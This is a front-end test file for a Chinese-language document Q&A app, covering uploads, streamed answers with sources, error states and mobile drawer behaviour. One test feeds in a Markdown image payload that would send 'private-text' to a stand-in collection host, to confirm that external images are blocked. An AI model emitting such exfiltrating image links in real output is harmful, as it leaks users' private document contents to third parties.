import { beforeEach, expect, it, vi } from "vitest";
import { fireEvent, render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import App from "./App";

const source = {
  document_id: "real-document-id",
  source: "原始资料.pdf",
  chunk_id: 4,
  page: 2,
  rank: 1,
  score: 0.875,
  content: "这是实际来源正文，不是模型生成的引用。",
};
const json = (body: unknown, status = 200) =>
  new Response(JSON.stringify(body), {
    status,
    headers: { "Content-Type": "application/json" },
  });
const frame = (name: string, payload: unknown) =>
  `event: ${name}\ndata: ${JSON.stringify(payload)}\n\n`;
const stream = (text: string) =>
  new Response(
    new ReadableStream({
      start(c) {
        c.enqueue(new TextEncoder().encode(text));
        c.close();
      },
    }),
    { headers: { "Content-Type": "text/event-stream" } },
  );
function backend(
  post: (url: string, options: RequestInit) => Response | Promise<Response>,
) {
  vi.stubGlobal(
    "fetch",
    vi.fn(async (input: RequestInfo | URL, options: RequestInit = {}) => {
      const url = String(input);
      return options.method === "POST"
        ? post(url, options)
        : json({ status: "ready" });
    }),
  );
}
beforeEach(() =>
  backend(() =>
    json({
      status: "indexed",
      document_id: "uploaded-id",
      filename: "笔记.txt",
      chunk_count: 2,
    }),
  ),
);

it("uploads with loading, then shows actual backend document ID", async () => {
  let complete!: (value: Response) => void;
  backend(
    () =>
      new Promise((resolve) => {
        complete = resolve;
      }),
  );
  render(<App />);
  const user = userEvent.setup();
  await user.upload(
    screen.getByLabelText("选择知识库文件"),
    new File(["内容"], "笔记.txt"),
  );
  expect(screen.getByRole("button", { name: "正在入库" })).toBeDisabled();
  complete(
    json({
      status: "indexed",
      document_id: "uploaded-id",
      filename: "笔记.txt",
      chunk_count: 2,
    }),
  );
  expect(await screen.findByText("uploaded-id")).toBeInTheDocument();
  expect(screen.getByText("已入库")).toBeInTheDocument();
});

it("shows duplicate separately and remembers local upload metadata", async () => {
  backend(() =>
    json({
      status: "duplicate",
      document_id: "existing-id",
      filename: "笔记.txt",
      chunk_count: 1,
    }),
  );
  const view = render(<App />);
  await userEvent.upload(
    screen.getByLabelText("选择知识库文件"),
    new File(["内容"], "笔记.txt"),
  );
  expect(await screen.findByText("已存在")).toBeInTheDocument();
  expect(screen.getByText("existing-id")).toBeInTheDocument();
  view.unmount();
  render(<App />);
  expect(screen.getByText("existing-id")).toBeInTheDocument();
});

it("supports drag-and-drop and rejects unsupported file types locally", async () => {
  render(<App />);
  fireEvent.drop(screen.getByLabelText("拖拽上传区域"), {
    dataTransfer: { files: [new File(["ok"], "笔记.txt")] },
  });
  expect(await screen.findByText("uploaded-id")).toBeInTheDocument();
  fireEvent.change(screen.getByLabelText("选择知识库文件"), {
    target: { files: [new File(["bad"], "bad.exe")] },
  });
  expect(await screen.findByText(/仅支持 PDF/)).toBeInTheDocument();
  expect(
    vi.mocked(fetch).mock.calls.filter(([, opts]) => opts?.method === "POST"),
  ).toHaveLength(1);
});

it("shows the backend upload error", async () => {
  backend(() => json({ detail: "PDF 没有可提取正文，请检查文件。" }, 422));
  render(<App />);
  await userEvent.upload(
    screen.getByLabelText("选择知识库文件"),
    new File(["bad"], "scan.pdf"),
  );
  expect(await screen.findByRole("alert")).toHaveTextContent(
    "PDF 没有可提取正文",
  );
});

it("ordinary chat displays real sources and expandable original content", async () => {
  backend((url) => {
    expect(url).toBe("/api/chat");
    return json({
      answer: "资料中的回答。",
      status: "answered",
      sources: [source],
    });
  });
  render(<App />);
  const user = userEvent.setup();
  await user.click(screen.getByRole("checkbox", { name: "流式回答" }));
  await user.type(
    screen.getByRole("textbox", { name: "输入问题" }),
    "我的问题",
  );
  await user.click(screen.getByRole("button", { name: "发送问题" }));
  expect(await screen.findByText("资料中的回答。")).toBeInTheDocument();
  expect(screen.getByText("原始资料.pdf")).toBeInTheDocument();
  expect(screen.getByText(source.content)).not.toBeVisible();
  await user.click(screen.getByText("原始资料.pdf"));
  expect(screen.getByText(source.content)).toBeVisible();
  expect(screen.getByText("real-document-id")).toBeVisible();
  expect(screen.getByText(/第 2 页/)).toBeInTheDocument();
  expect(screen.getByText(/0.875/)).toBeInTheDocument();
});

it("streams sources before text and exits generating state on done", async () => {
  let controller!: ReadableStreamDefaultController<Uint8Array>;
  backend(
    () =>
      new Response(
        new ReadableStream({
          start(c) {
            controller = c;
          },
        }),
        { headers: { "Content-Type": "text/event-stream" } },
      ),
  );
  render(<App />);
  const user = userEvent.setup();
  await user.type(
    screen.getByRole("textbox", { name: "输入问题" }),
    "测试流式",
  );
  await user.click(screen.getByRole("button", { name: "发送问题" }));
  expect(screen.getByRole("button", { name: "停止生成" })).toBeInTheDocument();
  controller.enqueue(
    new TextEncoder().encode(frame("sources", { sources: [source] })),
  );
  expect(await screen.findByText(source.source)).toBeInTheDocument();
  controller.enqueue(
    new TextEncoder().encode(frame("token", { token: "正在形成的答案" })),
  );
  expect(await screen.findByText("正在形成的答案")).toBeInTheDocument();
  controller.enqueue(new TextEncoder().encode(frame("done", {})));
  controller.close();
  await waitFor(() =>
    expect(
      screen.queryByRole("button", { name: "停止生成" }),
    ).not.toBeInTheDocument(),
  );
});

it("shows no_evidence distinctly without inventing sources", async () => {
  backend(() =>
    stream(
      frame("sources", { sources: [] }) +
        frame("token", { token: "知识库缺少资料。" }) +
        frame("done", { status: "no_evidence" }),
    ),
  );
  render(<App />);
  await userEvent.type(
    screen.getByRole("textbox", { name: "输入问题" }),
    "不存在的资料{Enter}",
  );
  expect(await screen.findByText("暂无检索证据")).toBeInTheDocument();
  expect(screen.queryByText("原始资料.pdf")).not.toBeInTheDocument();
});

it("retains partial answer and sources on SSE error", async () => {
  backend(() =>
    stream(
      frame("sources", { sources: [source] }) +
        frame("token", { token: "部分答案" }) +
        frame("error", { message: "模型暂时不可用" }),
    ),
  );
  render(<App />);
  await userEvent.type(
    screen.getByRole("textbox", { name: "输入问题" }),
    "问题{Enter}",
  );
  expect(await screen.findByText("模型暂时不可用")).toBeInTheDocument();
  expect(screen.getByText("部分答案")).toBeInTheDocument();
  expect(screen.getByText(source.source)).toBeInTheDocument();
});

it("keeps multiple turns on screen and clears them via new conversation", async () => {
  backend(() =>
    stream(
      frame("sources", { sources: [] }) +
        frame("token", { token: "回答内容" }) +
        frame("done", {}),
    ),
  );
  render(<App />);
  const user = userEvent.setup();
  await user.type(
    screen.getByRole("textbox", { name: "输入问题" }),
    "第一问{Enter}",
  );
  await screen.findByText("回答内容");
  await user.type(
    screen.getByRole("textbox", { name: "输入问题" }),
    "第二问{Enter}",
  );
  await waitFor(() => expect(screen.getAllByText("回答内容")).toHaveLength(2));
  await user.click(screen.getByRole("button", { name: "新建对话" }));
  expect(screen.queryByText("第一问")).not.toBeInTheDocument();
  expect(
    screen.getByText("让文档里的知识，成为你的答案。"),
  ).toBeInTheDocument();
});

it("Shift+Enter creates a newline and IME Enter does not send", async () => {
  render(<App />);
  const user = userEvent.setup();
  const input = screen.getByRole("textbox", { name: "输入问题" });
  await user.type(input, "第一行{Shift>}{Enter}{/Shift}第二行");
  expect(input).toHaveValue("第一行\n第二行");
  fireEvent.keyDown(input, { key: "Enter", keyCode: 229, isComposing: true });
  expect(
    vi.mocked(fetch).mock.calls.filter(([, opts]) => opts?.method === "POST"),
  ).toHaveLength(0);
});

it("shows API-unavailable state and can retry connection", async () => {
  vi.stubGlobal(
    "fetch",
    vi.fn().mockRejectedValue(new TypeError("Failed to fetch")),
  );
  render(<App />);
  expect(await screen.findByText("服务暂不可用")).toBeInTheDocument();
  backend(() => json({ answer: "ok", status: "answered", sources: [] }));
  await userEvent.click(screen.getByRole("button", { name: "重试连接" }));
  expect(await screen.findByText("知识库已就绪")).toBeInTheDocument();
});

it("mobile knowledge drawer opens and closes using real controls", async () => {
  vi.mocked(window.matchMedia).mockReturnValue({
    matches: true,
    media: "(max-width: 760px)",
    addEventListener: vi.fn(),
    removeEventListener: vi.fn(),
  } as unknown as MediaQueryList);
  render(<App />);
  const user = userEvent.setup();
  const toggle = screen.getByRole("button", { name: "打开知识库" });
  expect(toggle).toHaveAttribute("aria-expanded", "false");
  await user.click(toggle);
  expect(
    screen.getByRole("button", { name: "关闭知识库" }),
  ).toBeInTheDocument();
  await user.click(screen.getByRole("button", { name: "关闭知识库" }));
  expect(screen.getByRole("button", { name: "打开知识库" })).toHaveAttribute(
    "aria-expanded",
    "false",
  );
});

it("stops a stream through AbortController and keeps partial text", async () => {
  backend(
    (_url, options) =>
      new Response(
        new ReadableStream({
          start(controller) {
            controller.enqueue(
              new TextEncoder().encode(
                frame("sources", { sources: [source] }) +
                  frame("token", { token: "保留的内容" }),
              ),
            );
            options.signal?.addEventListener(
              "abort",
              () => controller.error(new DOMException("Aborted", "AbortError")),
              { once: true },
            );
          },
        }),
        { headers: { "Content-Type": "text/event-stream" } },
      ),
  );
  render(<App />);
  await userEvent.type(
    screen.getByRole("textbox", { name: "输入问题" }),
    "问题{Enter}",
  );
  expect(await screen.findByText("保留的内容")).toBeInTheDocument();
  await userEvent.click(screen.getByRole("button", { name: "停止生成" }));
  expect(
    await screen.findByText("已停止生成，现有内容已保留。"),
  ).toBeInTheDocument();
  expect(screen.getByText("保留的内容")).toBeInTheDocument();
});

it("never loads external images embedded in generated Markdown", async () => {
  backend(() =>
    stream(
      frame("sources", { sources: [] }) +
        frame("token", {
          token:
            "![资料截图](https://third-party.invalid/collect?document=private-text)",
        }) +
        frame("done", {}),
    ),
  );
  render(<App />);
  await userEvent.type(
    screen.getByRole("textbox", { name: "输入问题" }),
    "图片测试{Enter}",
  );
  expect(await screen.findByText("已省略外部图片")).toBeInTheDocument();
  expect(document.querySelector("img")).toBeNull();
});

it("mobile drawer traps focus, makes background inert, and restores focus", async () => {
  vi.mocked(window.matchMedia).mockReturnValue({
    matches: true,
    media: "(max-width: 760px)",
    addEventListener: vi.fn(),
    removeEventListener: vi.fn(),
  } as unknown as MediaQueryList);
  render(<App />);
  const user = userEvent.setup();
  const toggle = screen.getByRole("button", { name: "打开知识库" });
  await user.click(toggle);
  const close = screen.getByRole("button", { name: "关闭知识库" });
  expect(close).toHaveFocus();
  expect(document.querySelector("main")).toHaveAttribute("inert");
  await user.tab({ shift: true });
  expect(
    screen.getByRole("button", { name: "上传文档" }),
  ).toHaveFocus();
  await user.keyboard("{Escape}");
  expect(toggle).toHaveFocus();
  expect(document.querySelector("main")).not.toHaveAttribute("inert");
});
